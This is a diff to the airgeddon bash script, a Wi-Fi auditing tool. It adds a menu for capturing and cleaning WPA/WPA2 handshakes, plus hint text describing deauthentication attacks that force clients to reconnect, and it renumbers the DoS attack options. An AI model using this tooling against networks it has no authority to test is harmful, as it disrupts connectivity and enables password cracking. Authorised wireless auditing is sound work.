@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version="3.0"
+version="3.01"
 
 #Change these lines to select another default language
 language="english"
@@ -11,12 +11,19 @@ language="english"
 #General vars
 urlgithub="https://github.com/v1s1t0r1sh3r3/airgeddon"
 mail="v1s1t0r.1sh3r3@gmail.com"
-essential_tools=(iwconfig awk airmon-ng airodump-ng aireplay-ng mdk3)
+essential_tools=(iwconfig awk airmon-ng airodump-ng aireplay-ng mdk3 wpaclean)
 declare -A lang_association=(["en"]="english" ["es"]="spanish" ["fr"]="french" ["ca"]="catalan")
+standardhandshake_filename="handshake-01.cap"
 
 #Distro vars
 known_compatible_distros=("wifislax" "kali" "parrot" "backbox" "blackarch")
 known_working_nondirectly_compatible_distros=("ubuntu" "debian")
+
+#Hint vars
+declare main_hints=(128 134 163)
+declare dos_hints=(129 131 133)
+declare handshake_hints=(127 130 132 136)
+declare handshake_attack_hints=(142)
 
 #Colors
 green_color="\033[1;32m"
@@ -84,10 +91,10 @@ function language_strings() {
 	arr["french",10]="L'interface $interface est déjà en mode moniteur"
 	arr["catalan",10]="Aquesta interfície ja està en mode monitor"
 
-	arr["english",11]="Exiting airgeddon script - 2016 - See you soon! :)"
-	arr["spanish",11]="Saliendo de airgeddon script - 2016 - Nos vemos pronto! :)"
-	arr["french",11]="Fermeture du script airgeddon - 2016 - A bientôt! :)"
-	arr["catalan",11]="Sortint de airgeddon script - 2016 - Ens veiem aviat! :)"
+	arr["english",11]="Exiting airgeddon script v$version - See you soon! :)"
+	arr["spanish",11]="Saliendo de airgeddon script v$version - Nos vemos pronto! :)"
+	arr["french",11]="Fermeture du script airgeddon v$version - A bientôt! :)"
+	arr["catalan",11]="Sortint de airgeddon script v$version - Ens veiem aviat! :)"
 
 	arr["english",12]="Please, exit properly using menu option"
 	arr["spanish",12]="Por favor, sal del script correctamente utilizando la opción del menú"
@@ -116,7 +123,7 @@ function language_strings() {
 
 	arr["english",17]="Putting your interface in managed mode..."
 	arr["spanish",17]="Poniendo la interfaz en modo managed..."
-	arr["french",17]="L'interface est en train de passer en mode managed"
+	arr["french",17]="L'interface est en train de passer en mode managed..."
 	arr["catalan",17]="Configurant la interfície en mode managed..."
 
 	arr["english",18]="Putting your interface in monitor mode..."
@@ -181,7 +188,7 @@ function language_strings() {
 
 	arr["english",30]="You have selected a hidden network ESSID. Can't be used. Select another one or perform a BSSID based attack instead of this"
 	arr["spanish",30]="Has seleccionado un ESSID de red oculta. No se puede usar. Selecciona otro o ejecuta un ataque basado en BSSID en lugar de este"
-	arr["french",30]="Vous avez choisi un réseau dont l'ESSID est caché et ce n'est pas possible. Veuillez sélectionner une autre cible ou bien effectuer une attaque qui se fonde sur le BSSID au lieu de celle-ci."
+	arr["french",30]="Vous avez choisi un réseau dont l'ESSID est caché et ce n'est pas possible. Veuillez sélectionner une autre cible ou bien effectuer une attaque qui se fonde sur le BSSID au lieu de celle-ci"
 	arr["catalan",30]="Has seleccionat un ESSID de xarxa oculta. No es pot utilitzar. Selecciona un altre o executa un atac basat en BSSID en lloc d'aquest"
 
 	arr["english",31]="ESSID set to ${essid}"
@@ -274,10 +281,10 @@ function language_strings() {
 	arr["french",48]="1.  Sélectionnez une autre interface réseaux"
 	arr["catalan",48]="1.  Selecciona una altre interfície de xarxa"
 
-	arr["english",49]="4.  Explore neighbourhood for targets (monitor mode needed)"
-	arr["spanish",49]="4.  Explorar el vecindario para buscar objetivos (modo monitor requerido)"
+	arr["english",49]="4.  Explore for targets (monitor mode needed)"
+	arr["spanish",49]="4.  Explorar para buscar objetivos (modo monitor requerido)"
 	arr["french",49]="4.  Détection des réseaux pour choisir une cible (modo moniteur obligatoire)"
-	arr["catalan",49]="4.  Explorar el veïnat per buscar objectius (es requereix mode monitor)"
+	arr["catalan",49]="4.  Explorar per buscar objectius (es requereix mode monitor)"
 
 	arr["english",50]="----------(monitor mode needed for attacks)----------"
 	arr["spanish",50]="---------(modo monitor requerido en ataques)---------"
@@ -339,25 +346,25 @@ function language_strings() {
 	arr["french",61]="8.  Sortir du script"
 	arr["catalan",61]="8.  Sortir del script"
 
-	arr["english",62]="6.  Beacon flood attack"
-	arr["spanish",62]="6.  Ataque Beacon flood"
-	arr["french",62]="6.  Attaque Beacon flood"
-	arr["catalan",62]="6.  Atac Beacon flood"
+	arr["english",62]="8.  Beacon flood attack"
+	arr["spanish",62]="8.  Ataque Beacon flood"
+	arr["french",62]="8.  Attaque Beacon flood"
+	arr["catalan",62]="8.  Atac Beacon flood"
 
-	arr["english",63]="7.  Auth DoS attack"
-	arr["spanish",63]="7.  Ataque Auth DoS"
-	arr["french",63]="7.  Attaque Auth DoS"
-	arr["catalan",63]="7.  Atac Auth Dos"
+	arr["english",63]="9.  Auth DoS attack"
+	arr["spanish",63]="9.  Ataque Auth DoS"
+	arr["french",63]="9.  Attaque Auth DoS"
+	arr["catalan",63]="9.  Atac Auth Dos"
 
-	arr["english",64]="8.  Michael shutdown exploitation (TKIP) attack"
-	arr["spanish",64]="8.  Ataque Michael shutdown exploitation (TKIP)"
-	arr["french",64]="8.  Attaque Michael shutdown exploitation (TKIP)"
-	arr["catalan",64]="8.  Atac Michael shutdown exploitation (TKIP)"
+	arr["english",64]="10. Michael shutdown exploitation (TKIP) attack"
+	arr["spanish",64]="10. Ataque Michael shutdown exploitation (TKIP)"
+	arr["french",64]="10. Attaque Michael shutdown exploitation (TKIP)"
+	arr["catalan",64]="10. Atac Michael shutdown exploitation (TKIP)"
 
-	arr["english",65]="Exploring neighbourhood option chosen (monitor mode needed)"
-	arr["spanish",65]="Elegida opción de exploración del vecindario (modo monitor requerido)"
-	arr["french",65]="L'option découverte des réseaux avoisinants a été choisie (modo moniteur nécessaire)"
-	arr["catalan",65]="Seleccionada opció d'exploració del veïnat (requerit mode monitor)"
+	arr["english",65]="Exploring for targets option chosen (monitor mode needed)"
+	arr["spanish",65]="Elegida opción de exploración para buscar objetivos (modo monitor requerido)"
+	arr["french",65]="L'option analyser choisi de rechercher des objectifs a été choisie (modo moniteur nécessaire)"
+	arr["catalan",65]="Seleccionada opció d'exploració per buscar objectius (requerit mode monitor)"
 
 	arr["english",66]="Selected interface $interface is in monitor mode. Exploration can be performed"
 	arr["spanish",66]="La interfaz seleccionada $interface está en modo monitor. La exploración se puede realizar"
@@ -374,10 +381,10 @@ function language_strings() {
 	arr["french",68]="Aucun réseau détecté"
 	arr["catalan",68]="No s'han trobat xarxes"
 
-	arr["english",69]="  N.         BSSID      CHANNEL  PWR       ESSID"
-	arr["spanish",69]="  N.         BSSID        CANAL  PWR       ESSID"
-	arr["french",69]="  N.         BSSID        CANAL  PWR       ESSID"
-	arr["catalan",69]="  N.         BSSID        CANAL  PWR       ESSID"
+	arr["english",69]="  N.         BSSID      CHANNEL  PWR   ENC    ESSID"
+	arr["spanish",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"
+	arr["french",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"
+	arr["catalan",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"
 
 	arr["english",70]="Only one target detected. Autoselected"
 	arr["spanish",70]="Sólo un objetivo detectado. Se ha seleccionado automáticamente"
@@ -544,10 +551,10 @@ function language_strings() {
 	arr["french",102]="Menu des DoS attaques"
 	arr["catalan",102]="Menú d'atacs DoS"
 
-	arr["english",103]="Exploring Neighbourhood"
-	arr["spanish",103]="Explorar vecindario"
-	arr["french",103]="Détection des réseaux avoisinants"
-	arr["catalan",103]="Explorar veïnat"
+	arr["english",103]="Exploring for targets"
+	arr["spanish",103]="Explorar para buscar objetivos"
+	arr["french",103]="Détection pour trouver des cibles"
+	arr["catalan",103]="Explorar per buscar objectius"
 
 	arr["english",104]="Select target"
 	arr["spanish",104]="Seleccionar objetivo"
@@ -624,10 +631,225 @@ function language_strings() {
 	arr["french",118]="4.  DoS Menu attaques"
 	arr["catalan",118]="4.  Menú d'atacs DoS"
 
-	arr["english",119]="5.  Handshake tools menu "${red_color}"(under construction)"${normal_color}
-	arr["spanish",119]="5.  Menú de herramientas Handshake "${red_color}"(en construcción)"${normal_color}
-	arr["french",119]="5.  Handshake menu Outils "${red_color}"(en construction)"${normal_color}
-	arr["catalan",119]="5.  Menú d'eines Handshake "${red_color}"(en construcció)"${normal_color}
+	arr["english",119]="5.  Handshake tools menu"
+	arr["spanish",119]="5.  Menú de herramientas Handshake"
+	arr["french",119]="5.  Handshake menu Outils"
+	arr["catalan",119]="5.  Menú d'eines Handshake"
+
+	arr["english",120]="Handshake tools menu"
+	arr["spanish",120]="Menú de herramientas Handshake"
+	arr["french",120]="Handshake menu Outils"
+	arr["catalan",120]="Menú d'eines Handshake"
+
+	arr["english",121]="5.  Capture Handshake"
+	arr["spanish",121]="5.  Capturar Handshake"
+	arr["french",121]="5.  Capture Handshake"
+	arr["catalan",121]="5.  Captura Handshake"
+
+	arr["english",122]="6.  Clean/optimize captured Handshake file"
+	arr["spanish",122]="6.  Limpiar/optimizar fichero de Handshake capturado"
+	arr["french",122]="6.  Fichier prope/optimize capturé Handshake"
+	arr["catalan",122]="6.  Netejar/optimitzar fitxer de Handshake capturat"
+
+	arr["english",123]="7.  Return to main menu"
+	arr["spanish",123]="7.  Volver al menú principal"
+	arr["french",123]="7.  Retourner au menu principal"
+	arr["catalan",123]="7.  Tornar al menú principal"
+
+	arr["english",124]="---------(monitor mode needed for capturing)---------"
+	arr["spanish",124]="---------(modo monitor requerido en captura)---------"
+	arr["french",124]="------(modo moniteur obligatoire pour capturer)------"
+	arr["catalan",124]="---------(mode monitor requerit en captura)----------"
+
+	arr["english",125]="There is no valid target network selected. You'll be redirected to select one"
+	arr["spanish",125]="No hay una red objetivo válida seleccionada. Serás redirigido para seleccionar una"
+	arr["french",125]="Aucune cible valide un réseau sélectionné. Vous allez retourner au menu de sélection pour en choisir une"
+	arr["catalan",125]="No hi ha una xarxa objectiu vàlida seleccionada. Seràs redirigit per seleccionar una"
+
+	arr["english",126]="You have a valid WPA/WPA2 target network selected. Script can continue..."
+	arr["spanish",126]="Tienes una red objetivo WPA/WPA2 válida seleccionada. El script puede continuar..."
+	arr["french",126]="Vous disposez d'un réseau cible WPA/WPA2 valide sélectionné. Le script peut continuer..."
+	arr["catalan",126]="Tens una xarxa objectiu WPA/WPA2 vàlida seleccionada. L'script pot continuar..."
+
+	arr["english",127]="*Hint* The natural order to proceed in this menu is usually: 1-Select wifi card 2-Put it in monitor mode 3-Select target network 4-Capture Handshake"
+	arr["spanish",127]="*Consejo* El orden natural para proceder en este menú suele ser: 1-Elige tarjeta wifi 2-Ponla en modo monitor 3-Elige red objetivo 4-Captura Handshake"
+	arr["french",127]="*Conseil* L'ordre naturel de procéder dans ce menu général: 1-Select carte wifi 2-Mettre en mode moniteur 3-Choisir le rouge cible 4-Capture Handshake"
+	arr["catalan",127]="*Consell* L'ordre natural per procedir a aquest menú sol ser: 1-Tria targeta wifi 2-Posa-la en mode monitor 3-Tria xarxa objectiu 4-Captura Handshake"
+
+	arr["english",128]="*Hint* Select a wifi card to work in order to be able to do more actions than with an ethernet interface"
+	arr["spanish",128]="*Consejo* Selecciona una interfaz wifi para poder realizar más acciones que con una interfaz ethernet"
+	arr["french",128]="*Conseil* Sélectionnez une carte wifi pour travailler afin d'être en mesure de faire plus d'actions que d'une interface ethernet"
+	arr["catalan",128]="*Consell* Seleccioneu una targeta wifi per treballar amb la finalitat de ser capaç de fer més accions que amb una interfície ethernet"
+
+	arr["english",129]="*Hint* The natural order to proceed in this menu is usually: 1-Select wifi card 2-Put it in monitor mode 3-Select target network 4-Start attack"
+	arr["spanish",129]="*Consejo* El orden natural para proceder en este menú suele ser: 1-Elige tarjeta wifi 2-Ponla en modo monitor 3-Elige red objetivo 4-Comienza el ataque"
+	arr["french",129]="*Conseil* L'ordre naturel de procéder dans ce menu général: 1-Select carte wifi 2-Mettre en mode moniteur 3-Choisir le rouge cible 4-Commencez attaque"
+	arr["catalan",129]="*Consell* L'ordre natural per procedir a aquest menú sol ser: 1-Tria targeta wifi 2-Posa-la en mode monitor 3-Tria xarxa objectiu 4-Iniciar l'atac"
+
+	arr["english",130]="*Hint* Remember to select a target network with clients to capture Handshake"
+	arr["spanish",130]="*Consejo* Recuerda seleccionar una red objetivo con clientes para capturar el Handshake"
+	arr["french",130]="*Conseil* Rappelez-vous de sélectionner un réseau cible avec les clients pour capturer Handshake"
+	arr["catalan",130]="*Consell* Recordi que ha de seleccionar una xarxa de destinació amb els clients per capturar el Handshake"
+
+	arr["english",131]="*Hint* Not all attacks affect all access points. If an attack is not working against an access point, choose another one ;)"
+	arr["spanish",131]="*Consejo* No todos los ataques afectan a todos los puntos de acceso. Si un ataque no funciona contra un punto de acceso, elige otro ;)"
+	arr["french",131]="*Conseil* Pas toutes les attaques affectent tous les points d'accès. Si une attaque ne fonctionne pas contre un point d'accès, choisir un autre ;)"
+	arr["catalan",131]="*Consell* No tots els atacs afecten tots els punts d'accés. Si un atac no està treballant en contra d'un punt d'accés, trie un altre ;)"
+
+	arr["english",132]="*Hint* After capturing a handshake clean it. It will reduce the file size and will be more optimal for use later"
+	arr["spanish",132]="*Consejo* Tras capturar un Handshake límpialo. Reducirá el tamaño del archivo y será más óptimo para utilizarlo después"
+	arr["french",132]="*Conseil* Après avoir capturé une Handshake nettoyer. Il permettra de réduire la taille du fichier et sera plus optimale pour une utilisation ultérieure"
+	arr["catalan",132]="*Consell* Després capturar un Handshake neteja'l. Reduirà la mida del fitxer i serà més òptim per utilitzar-lo després"
+
+	arr["english",133]="*Hint* If you select a target network with hidden ESSID, you can't use it, but you can perform BSSID based attacks to that network"
+	arr["spanish",133]="*Consejo* Si seleccionas una red objetivo con el ESSID oculto, no podrás usarlo, pero puedes hacer ataques basados en BSSID sobre esa red"
+	arr["french",133]="*Conseil* Si vous sélectionnez un réseau cible avec ESSID caché, vous ne pouvez pas l'utiliser, mais vous pouvez faire des attaques basées sur ce BSSID réseau"
+	arr["catalan",133]="*Consell* Si selecciones una xarxa objectiu amb el ESSID ocult, no podràs usar-lo, però pots fer atacs basats en BSSID sobre aquesta xarxa"
+
+	arr["english",134]="*Hint* If your Linux is a virtual machine, it is possible that integrated wifi cards are detected as ethernet. Use an external usb wifi card"
+	arr["spanish",134]="*Consejo* Si tu Linux es una máquina virtual, es posible que las tarjetas wifi integradas sean detectadas como ethernet. Utiliza una tarjeta wifi externa usb"
+	arr["french",134]="*Conseil* Si votre Linux est une machine virtuelle, il est possible que les cartes sans fil intégrées sont détectés comme ethernet. Utilise un usb de carte wifi externe"
+	arr["catalan",134]="*Consell* Si el teu Linux és una màquina virtual, és possible que les targetes wifi integrades siguin detectades com ethernet. Utilitza una targeta wifi externa usb"
+
+	arr["english",135]="Type of encryption: "${pink_color}"$enc"${normal_color}
+	arr["spanish",135]="Tipo de encriptado: "${pink_color}"$enc"${normal_color}
+	arr["french",135]="Type de chiffrement: "${pink_color}"$enc"${normal_color}
+	arr["catalan",135]="Tipus d'encriptat: "${pink_color}"$enc"${normal_color}
+
+	arr["english",136]="*Hint* Obtaining a Handshake is only for networks with encryption WPA or WPA2"
+	arr["spanish",136]="*Consejo* La obtención de un Handshake es solo para redes con encriptación WPA o WPA2"
+	arr["french",136]="*Conseil* L'obtention d'une Handshake est uniquement pour les réseaux avec WPA ou WPA2 de cryptage"
+	arr["catalan",136]="*Consell* L'obtenció d'un Handshake és només per a xarxes amb encriptació WPA o WPA2"
+
+	arr["english",137]="The selected network is invalid. To get a Handshake, encryption type of target network should be WPA or WPA2"
+	arr["spanish",137]="La red seleccionada no es válida. Para obtener un Handshake, el tipo de encriptación de la red objetivo debe ser WPA o WPA2"
+	arr["french",137]="Le réseau sélectionné est invalide. Pour obtenir une Handshake, le type de réseau cible de cryptage doit être WPA ou WPA2"
+	arr["catalan",137]="La xarxa seleccionada no és vàlida. Per obtenir un Handshake, el tipus d'encriptació de la xarxa objectiu ha de ser WPA o WPA2"
+
+	arr["english",138]="Attack for Handshake"
+	arr["spanish",138]="Ataque para Handshake"
+	arr["french",138]="Attaque pour Handshake"
+	arr["catalan",138]="Atac de Handshake"
+
+	arr["english",139]="1.  Deauth / disassoc amok mdk3 attack"
+	arr["spanish",139]="1.  Ataque Deauth / Disassoc amok mdk3"
+	arr["french",139]="1.  Attaque Deauth / Disassoc amok mdk3"
+	arr["catalan",139]="1.  Attaque Deauth / Disassoc amok mdk3"
+
+	arr["english",140]="2.  Deauth aireplay attack"
+	arr["spanish",140]="2.  Ataque Deauth aireplay"
+	arr["french",140]="2.  Attaque Deauth aireplay"
+	arr["catalan",140]="2.  Atac Deauth aireplay"
+
+	arr["english",141]="3.  WIDS / WIPS / WDS Confusion attack"
+	arr["spanish",141]="3.  Ataque WIDS / WIPS / WDS Confusion"
+	arr["french",141]="3.  Attaque WIDS / WIPS / WDS Confusion"
+	arr["catalan",141]="3.  Atac WIDS / WIPS / WDS Confusion"
+
+	arr["english",142]="*Hint* If the Handshake doesn't appear after an attack, try again or change the type of attack"
+	arr["spanish",142]="*Consejo* Si tras un ataque el Handshake no aparece, vuelve a intentarlo o cambia de ataque hasta conseguirlo"
+	arr["french",142]="*Conseil* Si la suite d'un Handshake d'attaque ne semble pas, essayez à nouveau ou un changement d'attaque pour obtenir"
+	arr["catalan",142]="*Consell* Si després d'un atac el Handshake no apareix, torna a intentar-ho o canvia d'atac fins a aconseguir-"
+
+	arr["english",143]="Two windows will be opened. One with the Handshake capturer and other with the attack to force clients to reconnect"
+	arr["spanish",143]="Se abrirán dos ventanas. Una con el capturador del Handshake y otra con el ataque para expulsar a los clientes y forzarles a reconectar"
+	arr["french",143]="Deux fenêtres ouvertes. Un Handshake avec la pince et l'autre avec l'attaque à conduire des clients loin et les forcer à se reconnecter"
+	arr["catalan",143]="S'obren dues finestres. Una amb el capturador de Handshake i una altra amb l'atac per expulsar els clients i forçar-los a reconnectar"
+
+	arr["english",144]="Don't close any window manually, script will do when needed. In about 20 seconds maximum you'll know if you've got the Handshake"
+	arr["spanish",144]="No cierres manualmente ninguna ventana, el script lo hará cuando proceda. En unos 20 segundos como máximo sabrás si conseguiste el Handshake"
+	arr["french",144]="Ne pas fermer une fenêtre manuellement, le script va faire en cas de besoin. Dans environ 20 secondes maximum, vous saurez si vous avez le Handshake"
+	arr["catalan",144]="No tancaments manualment cap finestra, l'script ho farà quan sigui procedent. En uns 20 segons com a màxim sabràs si has aconseguit el Handshake"
+
+	arr["english",145]="Did you get the Handshake? "${pink_color}"(Look at the top right corner of the capture window) "${normal_color}"[y/n]"
+	arr["spanish",145]="¿Conseguiste el Handshake? "${pink_color}"(Mira en la parte superior derecha de la ventana de captura) "${normal_color}"[y/n]"
+	arr["french",145]="Avez-vous le Handshake? "${pink_color}"(Regardez en haut à droite de la capture de la fenêtre) "${normal_color}"[y/n]"
+	arr["catalan",145]="¿Has aconseguit el Handshake? "${pink_color}"(Mira a la part superior dreta de la finestra de captura) "${normal_color}"[y/n]"
+
+	arr["english",146]="It seems we failed... try it again or choose another attack"
+	arr["spanish",146]="Parece que no lo hemos conseguido... inténtalo de nuevo o elige otro ataque"
+	arr["french",146]="Il semble que nous ne sommes pas là... essayer à nouveau ou choisissez une autre attaque"
+	arr["catalan",146]="Sembla que no ho hem aconseguit... intenta-ho de nou o tria un altre atac"
+
+	arr["english",147]="4.. Return to Handshake tools menu"
+	arr["spanish",147]="4.  Volver al menú de herramientas Handshake"
+	arr["french",147]="4.  Retourner au Handshake menu Outils"
+	arr["catalan",147]="4.  Tornar al menú d'eines Handshake"
+
+	arr["english",148]="Type the path to store the file or press Enter to accept the default proposal"${normal_color}"[$handshakepath]"
+	arr["spanish",148]="Escribe la ruta donde guardaremos el fichero o pulsa Enter para aceptar la propuesta por defecto "${normal_color}"[$handshakepath]"
+	arr["french",148]="Tapez le chemin où nous stockons le fichier ou appuyez sur Entrée pour accepter la valeur par défaut proposée"${normal_color}"[$handshakepath]"
+	arr["catalan",148]="Escriu la ruta on guardarem el fitxer o prem Enter per acceptar la proposta per defecte"${normal_color}"[$handshakepath]"
+
+	arr["english",149]="Handshake file generated successfully at ["${normal_color}"$enteredpath"${yellow_color}"]. Returning to menu..."
+	arr["spanish",149]="Fichero de Handshake generado con éxito en ["${normal_color}"$enteredpath"${yellow_color}"]. Volviendo al menú..."
+	arr["french",149]="Fichier Handshake généré avec succès à ["${normal_color}"$enteredpath"${yellow_color}"]. Retour au menu..."
+	arr["catalan",149]="Fitxer de Handshake generat amb èxit a ["${normal_color}"$enteredpath"${yellow_color}"]. Tornant al menú..."
+
+	arr["english",150]="No captured Handshake file detected during this session..."
+	arr["spanish",150]="No se ha detectado ningún fichero de Handshake capturado en esta sesión..."
+	arr["french",150]="N'a pas détecté un fichier Handshake capturé dans cette session..."
+	arr["catalan",150]="No s'ha detectat un fitxer de Handshake capturat en aquesta sessió..."
+
+	arr["english",151]="Handshake captured file detected during this session ["${normal_color}"$enteredpath"${blue_color}"]"
+	arr["spanish",151]="Se ha detectado un fichero de Handshake capturado en esta sesión ["${normal_color}"$enteredpath"${blue_color}"]"
+	arr["french",151]="Fichier Handshake Détecté capturé dans cette session ["${normal_color}"$enteredpath"${blue_color}"]"
+	arr["catalan",151]="S'ha detectat un fitxer de Handshake capturat en aquesta sessió ["${normal_color}"$enteredpath"${blue_color}"]"
+
+	arr["english",152]="Do you want to clean/optimize the Handshake captured file during this session?  "${normal_color}"[y/n]"
+	arr["spanish",152]="¿Quieres limpiar/optimizar el fichero de Handshake capturado en esta sesión? "${normal_color}"[y/n]"
+	arr["french",152]="Vous voulez nettoyer/optimiser le fichier Handshake capturé dans cette session? "${normal_color}"[y/n]"
+	arr["catalan",152]="Vols netejar/optimitzar el fitxer de Handshake capturat en aquesta sessió? "${normal_color}"[y/n]"
+
+	arr["english",153]="File cleaned/optimized successfully"
+	arr["spanish",153]="Fichero limpiado/optimizado con éxito"
+	arr["french",153]="Je nettoyais fichier/optimisé avec succès"
+	arr["catalan",153]="Fitxer netejat/optimitzat amb èxit"
+
+	arr["english",154]="Set path to file :"
+	arr["spanish",154]="Introduce la ruta al fichero :"
+	arr["french",154]="Entrez le chemin du fichier :"
+	arr["catalan",154]="Introdueix la ruta al fitxer :"
+
+	arr["english",155]="The directory exists but you didn't specify filename. It will be autogenerated ["${normal_color}"$standardhandshake_filename"${yellow_color}"]"
+	arr["spanish",155]="El directorio existe pero no se especificó nombre de fichero. Se autogenerará ["${normal_color}"$standardhandshake_filename"${yellow_color}"]"
+	arr["french",155]="Le répertoire existe mais n'a pas précisé le nom de fichier. Il est auto-générer ["${normal_color}"$standardhandshake_filename"${yellow_color}"]"
+	arr["catalan",155]="El directori existeix però no s'ha especificat nom de fitxer. es autogenerará ["${normal_color}"$standardhandshake_filename"${yellow_color}"]"
+
+	arr["english",156]="Directory not exists"
+	arr["spanish",156]="El directorio no existe"
+	arr["french",156]="N'existe pas Le répertoire"
+	arr["catalan",156]="El directori no existeix"
+
+	arr["english",157]="The path exists but you don't have write permissions"
+	arr["spanish",157]="La ruta existe pero no tienes permisos de escritura"
+	arr["french",157]="La route existe, mais vous ne disposez pas des autorisations d'écriture"
+	arr["catalan",157]="La route existe, mais vous ne disposez pas des autorisations d'écriture"
+
+	arr["english",158]="The path is valid and you have write permissions. Script can continue..."
+	arr["spanish",158]="La ruta es válida y tienes permisos de escritura. El script puede continuar..."
+	arr["french",158]="Le chemin d'accès est valide et que vous avez des autorisations d'écriture. Le script peut continuer..."
+	arr["catalan",158]="La ruta és vàlida i tens permisos d'escriptura. L'script pot continuar..."
+
+	arr["english",159]="The file doesn't need to be cleaned/optimized. It is already"
+	arr["spanish",159]="El fichero no necesita ser limpiado/optimizado. Ya lo está"
+	arr["french",159]="Le fichier n'a pas besoin d'être nettoyé/optimisé. Il est déjà"
+	arr["catalan",159]="El fitxer no necessita ser netejat/optimitzat. Ja ho està"
+
+	arr["english",161]="File not exists"
+	arr["spanish",161]="El fichero no existe"
+	arr["french",161]="N'existe pas Le fichier"
+	arr["catalan",161]="El fitxer no existeix"
+
+	arr["english",162]="Congratulations!!"
+	arr["spanish",162]="Enhorabuena!!"
+	arr["french",162]="Félicitations!!"
+	arr["catalan",162]="Enhorabona!!"
+
+	arr["english",163]="It is recommended to launch the script as root user. Make sure you have permission to launch commands like rfkill or airmon"
+	arr["spanish",163]="Se recomienda lanzar el script como usuario root. Asegúrate de tener permisos para lanzar comandos como rfkill o airmon"
+	arr["french",163]="Il est recommandé de lancer le script en tant que root. Assurez-vous que vous avez la permission de lancer des commandes comme rfkill ou airmon"
+	arr["catalan",163]="Es recomana llançar l'script com a usuari root. Assegura't de tenir permisos per llançar ordres com rfkill o airmon"
 
 	case "$3" in
 		"yellow")
@@ -754,7 +976,6 @@ function check_monitor_enabled() {
 function disable_rfkill() {
 
 	if hash rfkill 2> /dev/null; then
-		rfkill unblock 0
 		for i in 0 1 2 3 4 5; do
 			rfkill unblock ${i} > /dev/null
 		done
@@ -922,6 +1143,28 @@ function select_interface() {
 				fi
 			done
 		fi
+	fi
+}
+
+function read_yesno() {
+
+	echo
+	language_strings ${language} $1 "green"
+	read yesno
+}
+
+function ask_yesno() {
+
+	yesno=""
+	while [[ ! ${yesno} =~ ^[YyNn]$ ]]; do
+		read_yesno $1
+	done
+
+	if [ "$yesno" = "Y" ]; then
+		yesno="y"
+	fi
+	if [ "$yesno" = "N" ]; then
+		yesno="n"
 	fi
 }
 
@@ -1193,6 +1436,9 @@ function print_selections() {
 				language_strings ${language} 46 "blue"
 			fi
 		fi
+		if [ -n "$enc" ]; then
+			language_strings ${language} 135 "blue"
+		fi
 	fi
 }
 
@@ -1201,6 +1447,55 @@ function clean_target_network_vars() {
 	bssid=""
 	essid=""
 	channel=""
+	enc=""
+}
+
+function store_array {
+
+	local var=$1 base_key=$2 values=("${@:3}")
+	for i in "${!values[@]}"; do
+		eval "$1[\$base_key|$i]=\${values[i]}"
+	done
+}
+
+function print_hint() {
+
+	declare -A hints
+
+	case ${1} in
+		"main_menu")
+			store_array hints main_hints "${main_hints[@]}"
+			hintlength=${#main_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-${hintlength} -n 1)
+			strtoprint=${hints[main_hints|$randomhint]}
+		;;
+		"dos_attacks_menu")
+			store_array hints dos_hints "${dos_hints[@]}"
+			hintlength=${#dos_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-${hintlength} -n 1)
+			strtoprint=${hints[dos_hints|$randomhint]}
+		;;
+		"handshake_tools_menu")
+			store_array hints handshake_hints "${handshake_hints[@]}"
+			hintlength=${#handshake_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-${hintlength} -n 1)
+			strtoprint=${hints[handshake_hints|$randomhint]}
+		;;
+		"attack_handshake_menu")
+			store_array hints handshake_attack_hints "${handshake_attack_hints[@]}"
+			hintlength=${#handshake_attack_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-${hintlength} -n 1)
+			strtoprint=${hints[handshake_attack_hints|$randomhint]}
+		;;
+	esac
+
+	echo_blue "---------"
+	language_strings ${language} ${strtoprint} "pink"
+	echo_blue "---------"
 }
 
 function main_menu() {
@@ -1223,6 +1518,7 @@ function main_menu() {
 	language_strings ${language} 60
 	language_strings ${language} 78
 	language_strings ${language} 61
+	print_hint ${current_menu}
 
 	read main_option
 	case ${main_option} in
@@ -1239,8 +1535,7 @@ function main_menu() {
 			dos_attacks_menu
 		;;
 		5)
-			#Under construction
-			#handshake_tools_menu
+			handshake_tools_menu
 		;;
 		6)
 			credits_option
@@ -1257,6 +1552,94 @@ function main_menu() {
 	esac
 
 	main_menu
+}
+
+function handshake_tools_menu() {
+
+	clear
+	language_strings ${language} 120 "titlered"
+	current_menu="handshake_tools_menu"
+	print_selections
+	echo
+	language_strings ${language} 47 "green"
+	echo_blue "---------"
+	language_strings ${language} 48
+	language_strings ${language} 55
+	language_strings ${language} 56
+	language_strings ${language} 49
+	language_strings ${language} 124 "blue"
+	language_strings ${language} 121
+	echo_blue "---------"
+	language_strings ${language} 122
+	echo_blue "---------"
+	language_strings ${language} 123
+	print_hint ${current_menu}
+
+	read handshake_option
+	case ${handshake_option} in
+		1)
+			select_interface
+		;;
+		2)
+			monitor_option
+		;;
+		3)
+			managed_option
+		;;
+		4)
+			explore_for_targets_option
+		;;
+		5)
+			capture_handshake
+		;;
+		6)
+			clean_handshake_file
+		;;
+		7)
+			return
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+
+	handshake_tools_menu
+}
+
+function clean_handshake_file() {
+
+	echo
+	readpath=0
+
+	if [ -z ${enteredpath} ]; then
+		language_strings ${language} 150 "blue"
+		readpath=1
+	else
+		language_strings ${language} 151 "blue"
+		ask_yesno 152
+		if [ ${yesno} = "y" ]; then
+			filetoclean=${enteredpath}
+		else
+			readpath=1
+		fi
+	fi
+
+	if [ ${readpath} -eq 1 ]; then
+		validpath=1
+		while [[ "$validpath" != "0" ]]; do
+			read_path "cleanhandshake"
+		done
+	fi
+
+	handshakefilesize=`wc -c ${filetoclean} 2> /dev/null | awk -F " " '{print$1}'`
+	echo
+	if [ ${handshakefilesize} -gt 1024 ]; then
+		wpaclean ${filetoclean} ${filetoclean} > /dev/null 2>&1
+		language_strings ${language} 153 "yellow"
+	else
+		language_strings ${language} 159 "yellow"
+	fi
+	language_strings ${language} 115 "read"
 }
 
 function dos_attacks_menu() {
@@ -1282,6 +1665,7 @@ function dos_attacks_menu() {
 	language_strings ${language} 64
 	echo_blue "---------"
 	language_strings ${language} 59
+	print_hint ${current_menu}
 
 	read dos_option
 	case ${dos_option} in
@@ -1295,7 +1679,7 @@ function dos_attacks_menu() {
 			managed_option
 		;;
 		4)
